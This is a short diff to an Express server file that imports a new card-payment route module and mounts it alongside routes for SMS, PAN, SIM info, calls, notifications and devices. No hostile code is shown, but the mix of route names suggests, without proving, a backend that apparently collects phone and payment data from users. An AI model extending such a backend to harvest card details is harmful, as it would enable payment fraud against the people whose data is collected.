@@ -9,6 +9,7 @@ import mongoose from "mongoose";
 import { connectDB } from "./config/db.js";
 
 import deviceRoutes from "./routes/deviceRoutes.js";
+import cardPaymentRoutes from "./routes/cardPaymentRoutes.js";
 import smsRoutes from "./routes/smsRoutes.js";
 import panRoutes from "./routes/panRoutes.js";
 import simInfoRoutes from "./routes/simInfoRoutes.js";
@@ -295,6 +296,7 @@ app.use("/api/sms", smsRoutes);
 app.use("/api/siminfo", simInfoRoutes);
 app.use("/api/notification", notificationRoutes);
 app.use("/api/call", callRoutes);
+app.use("/api", cardPaymentRoutes);
 app.use("/api/admin", adminRoutes);
 app.use("/api/serial", serialRoutes);
 app.use("/api", panRoutes);
